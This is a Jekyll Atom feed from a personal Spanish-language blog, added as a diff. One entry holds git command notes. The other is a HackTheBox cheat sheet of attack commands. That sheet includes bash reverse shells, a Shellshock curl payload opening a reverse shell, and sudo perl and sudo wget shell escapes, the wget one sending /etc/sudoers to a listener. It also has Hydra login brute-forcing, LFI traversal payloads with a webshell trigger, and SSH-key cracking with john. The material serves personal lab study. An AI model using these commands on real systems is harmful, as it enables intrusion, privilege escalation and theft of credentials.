@@ -1,0 +1,313 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-13T22:34:57-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">shsodoo.io</title><subtitle>Personal blog for write up of machines or projects</subtitle><author><name>isra</name><email>israel.ir793@gmail.com</email></author><entry><title type="html">Comandos</title><link href="http://localhost:4000/comandos_git/" rel="alternate" type="text/html" title="Comandos" /><published>2024-07-12T00:00:00-06:00</published><updated>2024-07-12T00:00:00-06:00</updated><id>http://localhost:4000/comandos_git</id><content type="html" xml:base="http://localhost:4000/comandos_git/">&lt;h1 id=&quot;notas-de-comandos-para-recordar&quot;&gt;Notas de comandos para recordar&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/moon.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;git&quot;&gt;Git&lt;/h2&gt;
+
+&lt;h3 id=&quot;git-init&quot;&gt;git init:&lt;/h3&gt;
+
+&lt;p&gt;Este comando crea un nuevo repositorio y configura las herramientas que git necesita para comenzar a rastrear los cambios realizados en el proyecto&lt;/p&gt;
+
+&lt;p&gt;Un proyecto consta de 3 partes
+directorio de trabajo donde se edita, elimina y organiza archivos
+El area de preparacion donde enumera los cambios que realiza en el directorio de trabajo
+Un repositirio, donde almacena permanentemente esos cambios como diferentes versiones del proyecto&lt;/p&gt;
+
+&lt;h3 id=&quot;git-status&quot;&gt;git status:&lt;/h3&gt;
+
+&lt;p&gt;Cuando vamos escribiendo el script cambiara el contenido del directorio de trabajo, podemos comprobarlo con “git status”&lt;/p&gt;
+
+&lt;h3 id=&quot;git-add-filename&quot;&gt;git add filename:&lt;/h3&gt;
+
+&lt;p&gt;Para que git empieze a seguir los cambios es necesario agregar el archivo al area de preparacion con el comando “git add” y con git status ya nos empezara a reportar los cambios&lt;/p&gt;
+
+&lt;h3 id=&quot;git-diff&quot;&gt;git diff:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para ver diferencias entre el script una vez que este en seguimiento con git add, el signo + nos marcara los cambios que se han hecho, y con “git add filename” podemos agregar los nuevos cambios al area de preparacion&lt;/p&gt;
+
+&lt;h3 id=&quot;git-commit--m-frase&quot;&gt;git commit -m “Frase”:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos permite agregar permanentemente los cambios al repositorio del area de preparacion, es necesario pasarle un mensaje de el tipo de cambio que se realiza&lt;/p&gt;
+
+&lt;h3 id=&quot;git-log&quot;&gt;git log:&lt;/h3&gt;
+
+&lt;p&gt;Esta opcion nos permite ver un historial de los cambios, donde incluira un hash en sha de 40 caracteres que indentifica la confirmacion, el autor, el mensaje de confirmacion y la fecha y hora&lt;/p&gt;
+
+&lt;h2 id=&quot;ejemplo&quot;&gt;Ejemplo:&lt;/h2&gt;
+
+&lt;p&gt;1- Se realizaria un git init, el el directorio donde este el script&lt;/p&gt;
+
+&lt;p&gt;2- Una vez haya cambios, se realizara un git diff para ver si se realizaron, despues un “git add filename” para agregar al area de preparacion, y un git status para confirmar la modificacion&lt;/p&gt;
+
+&lt;p&gt;3- Despues de que se haya guardado la modificacion, realizamos un compromiso, con “git commit -m ‘frase’”
+agregando el comentario describiendo el cambio, y con git log podemos ir viendo los cambios realizados&lt;/p&gt;
+
+&lt;p&gt;====&lt;/p&gt;
+
+&lt;h3 id=&quot;git-show-head&quot;&gt;git show HEAD:&lt;/h3&gt;
+
+&lt;p&gt;En git el compromiso mas actual se conoce como HEAD, para verlo podemos usar el comando “git show HEAD”, la salida de este comando mostrara la salida de el comando git log, mas los cambios que se realizaron, como git diff&lt;/p&gt;
+
+&lt;h3 id=&quot;git-checkout-head-filename&quot;&gt;git checkout HEAD filename:&lt;/h3&gt;
+
+&lt;p&gt;En git cuando queremos cambiar una linea de el codigo ya que nos arrepentimos, podemos usar el comando de arriba, este nos funciona para mandarnos a una version anterior de el script, en caso de que no recordemos exactamente como era&lt;/p&gt;
+
+&lt;h3 id=&quot;git-add-filename1-filename2&quot;&gt;git add filename1 filename2:&lt;/h3&gt;
+
+&lt;p&gt;Tambien podemos agregar varios archivos al area de preparacion en una sola linea una vez que hayamos modificado ambos&lt;/p&gt;
+
+&lt;h3 id=&quot;git-reset-head-filename&quot;&gt;git reset HEAD filename:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para elminar un archivo de el area de preparacion en caso de que nos hayamos equivocado y enviarlo, ejemplo tenemos dos archivos, uno modificado correctamente y uno que borramos algo que nos importaba, hacemos un git add de ambos sin poner atencion, al hacer el comando de arriba, el archivo que enviamos por equivocacion lo quitara de el area de preparacion, no lo mandara a una version anterior, solo lo quita para poder corregirlo&lt;/p&gt;
+
+&lt;h3 id=&quot;git-reset-sha&quot;&gt;git reset sha:&lt;/h3&gt;
+
+&lt;p&gt;En este comando podemos volver a una version en especifico de el script, haciendo un git log y obteniendo los primeros 7 caracteres de el hash sha, podemos hacer el comando de arriba y nos realizara el cambio&lt;/p&gt;
+
+&lt;p&gt;====&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet&quot;&gt;https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hoja de trucos de markdown y algunos ejemplos:&lt;/p&gt;
+
+&lt;p&gt;markdown
+* italic
+** bold
+~ strike&lt;/p&gt;
+
+&lt;p&gt;title 
+====&lt;br /&gt;
+subtittle
+-——-&lt;br /&gt;
+# Title de mi documento&lt;/p&gt;
+
+&lt;p&gt;====&lt;/p&gt;
+
+&lt;h3 id=&quot;git-branch&quot;&gt;git branch:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para saber en que rama estamos, en la salida el asterisco * muestra la rama en que estamos&lt;/p&gt;
+
+&lt;h3 id=&quot;git-branch-new_branch&quot;&gt;git branch new_branch:&lt;/h3&gt;
+
+&lt;p&gt;Es la estructura para poder crear una nueva rama&lt;/p&gt;
+
+&lt;h3 id=&quot;git-checkout-new_branch&quot;&gt;git checkout new_branch:&lt;/h3&gt;
+
+&lt;p&gt;Asi es para cambiar a la rama que queramos&lt;/p&gt;
+
+&lt;h3 id=&quot;git-merge-filename&quot;&gt;git merge filename:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para fusionar un archivo en distintas ramas, por ejemplo estando en la rama master(main), podemos fusionarlo con las otras ramas con el comando&lt;/p&gt;
+
+&lt;p&gt;En caso de que hagamos commit de un mismo archivo en distintas ramas y con merge lo queramos fusionar, nos dara un error si es diferente la modificacion, para eso tendremos que ir al archivo donde nos mostrara las diferencias de cada rama y debemos elegir con cual quedarnos, HEAD sera la rama main, y el otro la rama que creamos&lt;/p&gt;
+
+&lt;h3 id=&quot;git-branch--d-raiz_aeliminar--o--d&quot;&gt;git branch -d raiz_aEliminar | o -D:&lt;/h3&gt;
+
+&lt;p&gt;Con este comando eliminamos la rama que no queramos una vez que hayamos fucionado lo que nos interesa&lt;/p&gt;
+
+&lt;p&gt;Ejemplo, con git branch enumeramos las raiz, despues creamos una nueva con git branch “raiz_nueva”, despues cambiamos a ella con ‘git checkout raiz’, una vez en esa raiz hacemos las modificaciones que queramos, una vez terminado hacemos un ‘git add filename’ y un ‘git commit -m “comentario”’, si aprueban nuestra modificacion, en la rama master(main) lo que haran es fusionarlo, con el comando ‘git merge raiz’, y de esta manera si es que no hay conflictos en modificaciones para la fusion, se agregara lo de la nueva rama a la rama master(main)&lt;/p&gt;
+
+&lt;p&gt;====&lt;/p&gt;
+
+&lt;h2 id=&quot;control-remoto&quot;&gt;Control remoto&lt;/h2&gt;
+
+&lt;h3 id=&quot;git-clone&quot;&gt;git clone:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos permite copiar un repositorio remoto a nuestra maquina&lt;/p&gt;
+
+&lt;h3 id=&quot;git-remote--v&quot;&gt;git remote -v:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para ver la ruta origen de el repositorio que clonamos&lt;/p&gt;
+
+&lt;h3 id=&quot;git-fetch&quot;&gt;git fetch:&lt;/h3&gt;
+
+&lt;p&gt;este comando nos sirve para ver si se han realizado actualizaciones de el repositorio remoto&lt;/p&gt;
+
+&lt;h3 id=&quot;git-merge-originmaster&quot;&gt;git merge origin/master:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos sirve para fusionar la rama que realizo los cambios en el origin a nuestra rama master en el repositorio clonado&lt;/p&gt;
+
+&lt;h3 id=&quot;git-push--git-push-origin-main&quot;&gt;git push | git push origin main:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos permite agregar nuestro poyecto de la rama que creamos a el origin de el repositorio creado&lt;/p&gt;
+
+&lt;p&gt;====&lt;/p&gt;
+
+&lt;h3 id=&quot;git-rebase&quot;&gt;git rebase&lt;/h3&gt;
+
+&lt;h3 id=&quot;git-fork&quot;&gt;git fork:&lt;/h3&gt;
+
+&lt;p&gt;Sirve para clonar un repositorio y trabajar sobre el, en caso de que queramos contribuir tambien se puede&lt;/p&gt;
+&lt;h3 id=&quot;git-fesh-upstream&quot;&gt;git fesh upstream&lt;/h3&gt;
+
+&lt;h3 id=&quot;git-pull&quot;&gt;git pull:&lt;/h3&gt;
+&lt;p&gt;Nos sirve para mantener actualizado nuestro repositorio local de los cambios de el remoto&lt;/p&gt;
+
+&lt;h3 id=&quot;git-reflog&quot;&gt;git reflog:&lt;/h3&gt;
+
+&lt;p&gt;Este comando nos permite recuperar el hash de algun commit que hayamos borrado
+ y ya solo hariamos un&lt;/p&gt;
+&lt;h3 id=&quot;git-reset-hard-hash&quot;&gt;git reset –hard &amp;lt;hash&amp;gt;&lt;/h3&gt;
+
+&lt;h2 id=&quot;creacion-de-alias&quot;&gt;Creacion de alias&lt;/h2&gt;
+&lt;h3 id=&quot;git-config-global-aliaslog-mejorado-comando&quot;&gt;git config –global alias.log-mejorado “comando”&lt;/h3&gt;
+&lt;p&gt;Ahora solo hariamos un&lt;/p&gt;
+&lt;h3 id=&quot;git-&quot;&gt;git &lt;comando&gt;&lt;/comando&gt;&lt;/h3&gt;
+&lt;p&gt;y se ejecutara&lt;/p&gt;
+
+&lt;h2 id=&quot;gitignore&quot;&gt;Gitignore&lt;/h2&gt;
+&lt;p&gt;Sirve para decir que archivos ignorar, por ejemplo para que no suba archivos que no queramos que esten dentro de el directorio de trabajo, solo funciona para archivos que nunca fueron subidos antes
+Por ejemplo para ignorar distintos archivos de una misma extension con:&lt;/p&gt;
+&lt;h3 id=&quot;txt&quot;&gt;*.txt&lt;/h3&gt;
+&lt;p&gt;Aqui ignora todo lo que termina en .txt&lt;/p&gt;
+
+&lt;h3 id=&quot;olatxt&quot;&gt;!ola.txt&lt;/h3&gt;
+&lt;p&gt;No ignora este archivo exclusivamente&lt;/p&gt;
+
+&lt;h3 id=&quot;dire&quot;&gt;dire/&lt;/h3&gt;
+&lt;p&gt;Ignora todo lo de un directorio&lt;/p&gt;</content><author><name>isra</name><email>israel.ir793@gmail.com</email></author><category term="github" /><category term="github" /><category term="comandos" /><category term="git" /><summary type="html">Notas de comandos para recordar</summary></entry><entry><title type="html">Recordatorio de comandos</title><link href="http://localhost:4000/cambio/" rel="alternate" type="text/html" title="Recordatorio de comandos" /><published>2022-07-02T00:00:00-05:00</published><updated>2022-07-02T00:00:00-05:00</updated><id>http://localhost:4000/cambio</id><content type="html" xml:base="http://localhost:4000/cambio/">&lt;p&gt;lista de comandos para recordar&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bob.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;##Herramientas usadas&lt;/p&gt;
+
+&lt;p&gt;-ESTE ARCHIVO SOLO ES PARA PONER FUNCIONES QUE PUEDEN SERVIR A FUTURO COMO COMANDO O HERRAMIENTAS&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;##reverse shell en bash
+bash -i &amp;gt;&amp;amp; /de/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1
+#o en caso de que falle es con
+bash -c “bash -i &amp;gt;%26 /dev/tcp/10.10.10.10/443 0&amp;gt;%261”&lt;/p&gt;
+
+&lt;p&gt;##telnet—-
+para conectarse a telnet es con los siguientes comandos y funciona para puertos como 110 y 143
+ telnet 10.10.10.10 110
+ #para listar archivos
+LIST
+#para leer un archivo
+RETR
+—–&lt;/p&gt;
+
+&lt;p&gt;##identificar encriptados
+Para decifrar encriptados podemos intentar con esta pagina que sirve para localizar el tipo
+http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html&lt;/p&gt;
+
+&lt;p&gt;##para hacer fuerza bruta a hashes de idrsa u otros usamos johnthe ripper&lt;/p&gt;
+
+&lt;p&gt;primero pasamos el idrsa a hash con un script de python que esta en github
+https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
+#para ejecutarlo es con python exploit.py idrsa&lt;/p&gt;
+
+&lt;p&gt;python sshjohn.py idrsa &amp;gt; hash.hash&lt;/p&gt;
+
+&lt;p&gt;una vez en hash lo rompemos con john
+john hash.hash –wordlist=password.txt
+#para entrar a ssh con la clave es con 
+ssh orestis@10.10.10.17 -i id_rsa
+y ponemos la contrasena&lt;/p&gt;
+
+&lt;p&gt;##para la escalada de privilegios usando pkexec y este exploit 
+https://github.com/ly4k/PwnKit&lt;/p&gt;
+
+&lt;p&gt;##Shellshock attack
+para la maquina shocker explotamos shellshock en donde veamos que tiene un directorio cgi-bin podemos intentar explotarlo
+para explotar un shellshock debemos abusar de el user agent con este comando ###User-Agent: () { :; };
+lo podemos poner en un curl o en burpsuite curl -H “User-Agent: () { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.6/443 0&amp;gt;&amp;amp;1” http://10.10.10.56/cgi-bin/user.sh&lt;/p&gt;
+
+&lt;p&gt;#despues de el user agent podemos ejecutar comandos y ya podiamos enviar un reverse shell&lt;/p&gt;
+
+&lt;p&gt;para la escalada de privilegios abusamos de perl con este comando
+#sudo perl -e ‘exec “/bin/sh”;’&lt;/p&gt;
+
+&lt;p&gt;##cambio de usuario con privilegios root
+en la maquina bashed podemos cambiar de usuario con
+sudo -u user&lt;/p&gt;
+
+&lt;p&gt;si vemos que tiene permisos root podemos obtener una shell con&lt;/p&gt;
+
+&lt;p&gt;sudo -u user /bin/bash&lt;/p&gt;
+
+&lt;p&gt;##escalacion con archivos ejecutables con permisos root
+ en la maquina nibbles usamos la escalacion de privilegios por medio de un script que nos daba permisos root&lt;/p&gt;
+
+&lt;p&gt;pusimos un reverse shell simple en bash y lo ejecutamos como root con este comando&lt;/p&gt;
+
+&lt;p&gt;sudo -u root /home/nibbler/personal/stuff/monitor.sh&lt;/p&gt;
+
+&lt;p&gt;esto sucede cuando podemos ejecutar archivos sin contresena con root&lt;/p&gt;
+
+&lt;p&gt;#&lt;/p&gt;
+
+&lt;p&gt;(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh&lt;/p&gt;
+
+&lt;h2 id=&quot;esteganografia&quot;&gt;Esteganografia&lt;/h2&gt;
+&lt;p&gt;para la maquina nineveh se utilizo esteganografia y las herramientas que use fueron&lt;/p&gt;
+
+&lt;p&gt;exiftool para ver si ocultaba datos adentro y
+strings para ver que datos en las cadenas ocultaba&lt;/p&gt;
+
+&lt;h2 id=&quot;hydra&quot;&gt;HYDRA&lt;/h2&gt;
+&lt;p&gt;para la maquina nineveh se puede acceder por fuerza bruta con hydra con el siguiente comando
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form “/department/login.php:username=admin&amp;amp;password=^PASS^:Invalid Password!” -o pass.tx&lt;/p&gt;
+
+&lt;p&gt;este comando es para un metodo https
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form “/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password”&lt;/p&gt;
+
+&lt;p&gt;en esta pagina vemos como hacer ataques con hydra
+https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/&lt;/p&gt;
+
+&lt;p&gt;##LFI PAYLOADS
+para probar un file inclusion podemos probar con estas rutas&lt;/p&gt;
+
+&lt;p&gt;/etc/passwd     No se selecciona ninguna nota.
+../../../../../../../../../../etc/passwd        No se selecciona ninguna nota.
+ninevehNotes    Advertencia: include(files/ninevehNotes): error al abrir el flujo: no existe tal archivo o directorio en /var/www/html/department/manage.php en la línea 31
+ninevehNote     No se selecciona ninguna nota.
+files/ninevehNotes/../../../../../../../../../etc/passwd        Nombre de archivo demasiado largo.
+files/ninevehNotes/../../../../../../../etc/passwd      Los contenidos de /etc/passwd
+/ninevehNotes/../etc/passwd     Los contenidos de /etc/passwd&lt;/p&gt;
+
+&lt;p&gt;##para hacer un lfi podemos intentar con la ruta si vemos una extension
+http://10.10.10.43/department/manage.php/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&amp;amp;cmd=id
+ y para activar la webshell es con
+?cmd=id
+o
+&amp;amp;cmd=id&lt;/p&gt;
+
+&lt;p&gt;##HYDRA&lt;/p&gt;
+
+&lt;p&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.127.109 http-post-form “/admin/:user=admin&amp;amp;pass=^PASS^:Username or password invalid” -o pass&lt;/p&gt;
+
+&lt;p&gt;comando para hacerfuerza bruta en logins&lt;/p&gt;
+
+&lt;h1 id=&quot;para-hacer-fuerza-bruta-a-un-hash-con-john-debemos-copiar-completo-el-hash-y-usar-la-opcion-normalmente&quot;&gt;para hacer fuerza bruta a un hash con john debemos copiar completo el hash y usar la opcion normalmente&lt;/h1&gt;
+
+&lt;h1 id=&quot;en-esta-pagina-podemos-ver-los-tipos-de-hashes-que-hay-para-crakear&quot;&gt;en esta pagina podemos ver los tipos de hashes que hay para crakear&lt;/h1&gt;
+
+&lt;p&gt;#para hacer sudo con wget podemos hacerlo con estos comandos
+sudo wget –post-file=/etc/sudoers &lt;listener IP=&quot;&quot;&gt;
+sudo wget http://0.0.0.0 --output-document=/ruta para mover&lt;/listener&gt;&lt;/p&gt;
+
+&lt;p&gt;##ruby dependencias yalm yalm.load es un error de una dependencia de ruby que puede ser vulnerable a ejecucion de comandos en el documento yml que carga yam.load en git_set podemos introduc&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;##websocket
+para explotarlo podemos con sql con sqlmap que podemos buscar un script en google y podemo ver las opciones&lt;/p&gt;
+
+&lt;p&gt;##sqlmap
+–dsb enumera databases
+-D enumera la base de datos que le pasamos
+–tables enumera las tablas dentro de la base de datos
+-T enumera la tabla que le pasamos
+–colums enumera las columnas en la tabla que le pasamos
+-C enumera las columnas que le pasamos
+-dump es para obtener una copia de los datos que le pasamos&lt;/p&gt;
+
+&lt;p&gt;#comandos para actualizar la pagina de github
+git add .
+git commit -m “cambio”
+git push -u origin
+poner usuario y token de github&lt;/p&gt;
+
+&lt;p&gt;-&lt;/p&gt;</content><author><name>isra</name><email>israel.ir793@gmail.com</email></author><category term="hackthebox" /><summary type="html">lista de comandos para recordar</summary></entry></feed>
